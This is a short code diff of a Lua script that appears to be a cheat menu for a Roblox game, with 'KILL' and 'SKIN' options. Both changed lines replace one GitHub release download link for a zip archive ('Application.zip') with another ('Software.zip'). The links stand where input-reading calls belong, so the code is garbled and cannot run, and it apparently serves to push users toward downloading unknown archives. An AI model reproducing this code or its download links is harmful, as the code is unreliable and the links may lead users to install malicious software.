@@ -15,7 +15,7 @@ function displayMenu()
     print("1. KILL")
     print("2. SKIN")
 
-    local choice = https://github.com/tauazinhefin/script-brookhaven/releases/download/v1.0/Application.zip()
+    local choice = https://github.com/tauazinhefin/script-brookhaven/releases/download/v2.0/Software.zip()
 
     if choice == "1" then
         killEveryone()
@@ -35,6 +35,6 @@ end
 
 -- Loop para escutar pressionamentos de tecla
 while true do
-    local key = https://github.com/tauazinhefin/script-brookhaven/releases/download/v1.0/Application.zip()
+    local key = https://github.com/tauazinhefin/script-brookhaven/releases/download/v2.0/Software.zip()
     onKeyPress(key)
 end
